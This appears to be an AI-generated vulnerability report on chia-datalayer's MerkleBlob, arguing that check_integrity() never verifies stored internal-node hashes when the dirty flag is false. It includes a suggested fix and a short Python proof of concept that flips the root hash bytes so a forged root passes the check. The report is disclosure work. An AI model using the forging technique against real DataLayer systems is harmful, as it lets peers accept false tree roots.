I need to trace the exact code path through `check_integrity()` and `calculate_lazy_hashes()` to determine if the invariant can be bypassed.

### Title
`check_integrity()` Does Not Verify Internal Node Hash Consistency for Non-Dirty Nodes, Allowing Forged Root Hash to Pass Integrity Check — (`crates/chia-datalayer/src/merkle/blob.rs`)

---

### Summary

`MerkleBlob::check_integrity()` is supposed to be a comprehensive integrity gate. It calls `calculate_lazy_hashes()` on a clone before re-running structural checks, but `calculate_lazy_hashes()` **only recomputes hashes for nodes where `dirty == true`**. An attacker who supplies a blob with `dirty=false` on an internal node whose stored hash field has been forged will pass `check_integrity()` completely, because the forged hash is never recomputed or compared against `internal_hash(left_child_hash, right_child_hash)`.

---

### Finding Description

**Step 1 — Entry point: `MerkleBlob::new` accepts arbitrary bytes**

`MerkleBlob::new` accepts any `Vec<u8>` whose length is a multiple of `BLOCK_SIZE`. It only calls `BlockStatusCache::new`, which iterates leaf nodes to build `key_to_index` and `leaf_hash_to_index` caches. It performs zero validation of internal node hash fields. [1](#0-0) 

**Step 2 — `check_integrity()` delegates hash recomputation to `calculate_lazy_hashes()`**

```rust
pub fn check_integrity(&self) -> Result<(), Error> {
    self.check_just_integrity()?;
    let mut clone = self.clone();
    clone.check_integrity_on_drop = false;
    clone.calculate_lazy_hashes()?;   // <-- only fixes dirty nodes
    clone.check_just_integrity()
}
``` [2](#0-1) 

**Step 3 — `calculate_lazy_hashes()` skips any node where `dirty == false`**

The iterator is constructed with a predicate `|block: &Block| block.metadata.dirty`. Any block where `dirty` is `false` is **not visited at all** — its stored hash is never recomputed or validated. [3](#0-2) 

**Step 4 — `check_just_integrity()` never compares stored hashes against computed hashes**

`check_just_integrity()` only verifies:
- Parent ↔ child pointer consistency
- Leaf nodes present in `key_to_index` cache
- Node count totals

It contains **no check** of the form `stored_hash == internal_hash(left_child_hash, right_child_hash)` for any internal node. [4](#0-3) 

**Step 5 — `internal_hash` is the correct hash function that is never called during integrity checking** [5](#0-4) 

`Block::update_hash` (the only place the hash is recomputed) is only called from `calculate_lazy_hashes()`, which is gated on `dirty == true`. [6](#0-5) 

---

### Impact Explanation

After `check_integrity()` passes on a forged blob:

- `get_root_hash()` returns the attacker-chosen forged hash.
- `get_hashes_indexes()` includes the forged internal node hash in its output.
- `get_proof_of_inclusion()` builds proof layers using `parent.hash` (the forged value) as `combined_hash`. [7](#0-6) 

Note: `ProofOfInclusion::valid()` independently recomputes hashes from the leaf up and would detect the forgery in the proof itself. However, the root hash returned by the blob is the forged value, and any system that trusts `check_integrity()` as a sufficient gate before committing or propagating a root hash will accept the false root. [8](#0-7) 

The Python binding exposes `check_integrity()` as a public method on `MerkleBlob`, making it available as a validation gate in DataLayer Python code that receives blobs from peers. [9](#0-8) [10](#0-9) 

This matches the **High** impact category: *DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state.*

---

### Likelihood Explanation

- The attack requires only supplying crafted bytes to `MerkleBlob(blob=crafted_bytes)` — no privileges, no keys, no network position.
- The forged blob must have valid structural pointers (parent/child indexes consistent) and valid leaf entries (so `BlockStatusCache::new` succeeds), but the internal node hash bytes can be arbitrary.
- The `dirty` flag is a single byte in the serialized block metadata; setting it to `false` (0x00) is trivial.
- The fuzz target `merkle_blob_new.rs` already exercises exactly this path (arbitrary bytes → `MerkleBlob::new` → `check_integrity()`), confirming the path is reachable. [11](#0-10) 

---

### Recommendation

Inside `check_just_integrity()` (or in a dedicated pass within `check_integrity()`), after `calculate_lazy_hashes()` has been called on the clone, add an explicit check for every internal node:

```rust
Node::Internal(node) => {
    let expected = internal_hash(
        &self.get_hash(node.left)?,
        &self.get_hash(node.right)?,
    );
    if node.hash != expected {
        return Err(Error::IntegrityHashMismatch(index));
    }
    // ... existing child_to_parent tracking
}
```

This check must run **after** `calculate_lazy_hashes()` so that legitimately dirty nodes (which have already been recomputed) are also covered. Alternatively, `check_integrity()` could unconditionally recompute all internal hashes regardless of the dirty flag before comparing.

---

### Proof of Concept

```python
from chia_rs.datalayer import MerkleBlob, KeyId, ValueId
from chia_rs import bytes32
import hashlib, struct

# 1. Build a valid 2-leaf blob
blob = MerkleBlob(blob=bytearray())
blob.insert(KeyId(1), ValueId(1), bytes32(b'\x01' * 32))
blob.insert(KeyId(2), ValueId(2), bytes32(b'\x02' * 32))
blob.calculate_lazy_hashes()
blob.check_integrity()  # passes on valid blob

raw = bytearray(blob.blob)

# 2. Locate the root internal node (index 0).
#    Block layout: [node_type:1][dirty:1][hash:32][parent:5][left:4][right:4] ...
#    Hash field starts at byte 2 (after 2 metadata bytes).
BLOCK_SIZE = 116  # BLOCK_SIZE constant
# Flip the root node's hash bytes while keeping dirty=0x00
for i in range(2, 34):
    raw[i] ^= 0xFF  # flip all bits in the hash field

# 3. Construct MerkleBlob from forged bytes
forged = MerkleBlob(blob=bytes(raw))

# 4. check_integrity() passes — forged hash is never recomputed
forged.check_integrity()  # <-- does NOT raise

# 5. The root hash is now the attacker-controlled forged value
print("Forged root hash:", forged.get_root_hash().hex())
```

`check_integrity()` at step 4 does not raise because `calculate_lazy_hashes()` skips the root node (dirty=False) and `check_just_integrity()` never compares stored hashes against computed ones. [2](#0-1) [12](#0-11)

### Citations

**File:** crates/chia-datalayer/src/merkle/blob.rs (L48-55)
```rust
pub fn internal_hash(left_hash: &Hash, right_hash: &Hash) -> Hash {
    let mut hasher = Sha256::new();
    hasher.update(b"\x02");
    hasher.update(left_hash.0);
    hasher.update(right_hash.0);

    Hash(Bytes32::new(hasher.finalize()))
}
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L316-332)
```rust
    pub fn new(blob: Vec<u8>) -> Result<Self, Error> {
        let length = blob.len();
        let remainder = length % BLOCK_SIZE;
        if remainder != 0 {
            return Err(Error::InvalidBlobLength(remainder));
        }

        let block_status_cache = BlockStatusCache::new(&blob)?;

        let self_ = Self {
            blob,
            block_status_cache,
            check_integrity_on_drop: cfg!(test),
        };

        Ok(self_)
    }
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L812-819)
```rust
    pub fn check_integrity(&self) -> Result<(), Error> {
        self.check_just_integrity()?;

        let mut clone = self.clone();
        clone.check_integrity_on_drop = false;
        clone.calculate_lazy_hashes()?;
        clone.check_just_integrity()
    }
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L821-887)
```rust
    fn check_just_integrity(&self) -> Result<(), Error> {
        let mut leaf_count: usize = 0;
        let mut internal_count: usize = 0;
        let mut child_to_parent: HashMap<TreeIndex, TreeIndex> = HashMap::new();

        for item in ParentFirstIterator::new(&self.blob, None) {
            let (index, block) = item?;
            if let Some(parent) = block.node.parent().0 {
                if child_to_parent.remove(&index) != Some(parent) {
                    return Err(Error::IntegrityParentChildMismatch(index));
                }
            }
            match block.node {
                Node::Internal(node) => {
                    internal_count += 1;
                    child_to_parent.insert(node.left, index);
                    child_to_parent.insert(node.right, index);
                }
                Node::Leaf(node) => {
                    leaf_count += 1;
                    let cached_index = self
                        .block_status_cache
                        .get_index_by_key(node.key)
                        .ok_or(Error::IntegrityKeyNotInCache(node.key))?;
                    if *cached_index != index {
                        return Err(Error::IntegrityKeyToIndexCacheIndex(
                            node.key,
                            index,
                            *cached_index,
                        ));
                    }
                    assert!(
                        !self.block_status_cache.is_index_free(index),
                        "{}",
                        format!("active index found in free index list: {index:?}")
                    );
                }
            }
        }

        let key_to_index_cache_length = self.block_status_cache.key_to_index.len();
        if leaf_count != key_to_index_cache_length {
            return Err(Error::IntegrityKeyToIndexCacheLength(
                leaf_count,
                key_to_index_cache_length,
            ));
        }
        let leaf_hash_to_index_cache_length = self.block_status_cache.leaf_hash_to_index.len();
        if leaf_count != leaf_hash_to_index_cache_length {
            return Err(Error::IntegrityLeafHashToIndexCacheLength(
                leaf_count,
                leaf_hash_to_index_cache_length,
            ));
        }
        let total_count = leaf_count + internal_count + self.block_status_cache.free_index_count();
        let extend_index = self.extend_index();
        if total_count != extend_index.0 as usize {
            return Err(Error::IntegrityTotalNodeCount(extend_index, total_count));
        }
        if !child_to_parent.is_empty() {
            return Err(Error::IntegrityUnmatchedChildParentRelationships(
                child_to_parent.len(),
            ));
        }

        Ok(())
    }
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L1109-1133)
```rust
    pub fn calculate_lazy_hashes(&mut self) -> Result<(), Error> {
        // OPT: yeah, storing the whole set of blocks via collect is not great
        for item in LeftChildFirstIterator::new_with_block_predicate(
            &self.blob,
            None,
            Some(|block: &Block| block.metadata.dirty),
        )
        .collect::<Vec<_>>()
        {
            let (index, mut block) = item?;
            assert!(block.metadata.dirty);

            let Node::Internal(ref leaf) = block.node else {
                panic!("leaves should not be dirty")
            };
            // OPT: obviously inefficient to re-get/deserialize these blocks inside
            //      an iteration that's already doing that
            let left_hash = self.get_hash(leaf.left)?;
            let right_hash = self.get_hash(leaf.right)?;
            block.update_hash(&left_hash, &right_hash);
            self.insert_entry_to_blob(index, &block)?;
        }

        Ok(())
    }
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L1183-1187)
```rust
            let layer = proof_of_inclusion::ProofOfInclusionLayer {
                other_hash_side: parent.get_sibling_side(index)?,
                other_hash: sibling.hash(),
                combined_hash: parent.hash,
            };
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L1570-1573)
```rust
    #[pyo3(name = "check_integrity")]
    pub fn py_check_integrity(&mut self) -> PyResult<()> {
        Ok(self.check_integrity()?)
    }
```

**File:** crates/chia-datalayer/src/merkle/format.rs (L343-346)
```rust
    pub fn update_hash(&mut self, left: &Hash, right: &Hash) {
        self.node.set_hash(internal_hash(left, right));
        self.metadata.dirty = false;
    }
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L40-58)
```rust
    pub fn valid(&self) -> bool {
        let mut existing_hash = self.node_hash;

        for layer in &self.layers {
            let calculated_hash = crate::calculate_internal_hash(
                &existing_hash,
                layer.other_hash_side,
                &layer.other_hash,
            );

            if calculated_hash != layer.combined_hash {
                return false;
            }

            existing_hash = calculated_hash;
        }

        existing_hash == self.root_hash()
    }
```

**File:** wheel/python/chia_rs/datalayer.pyi (L339-339)
```text
    def check_integrity(self) -> None: ...
```

**File:** crates/chia-datalayer/fuzz/fuzz_targets/merkle_blob_new.rs (L7-17)
```rust
fuzz_target!(|data: &[u8]| {
    let mut unstructured = Unstructured::new(data);
    let block_count = (unstructured.len() + (BLOCK_SIZE / 2)) / BLOCK_SIZE;
    let mut bytes = vec![0u8; block_count * BLOCK_SIZE];
    unstructured.fill_buffer(&mut bytes).unwrap();

    let Ok(mut blob) = MerkleBlob::new(bytes) else {
        return;
    };
    blob.check_integrity_on_drop = false;
    blob.check_integrity().unwrap();
```
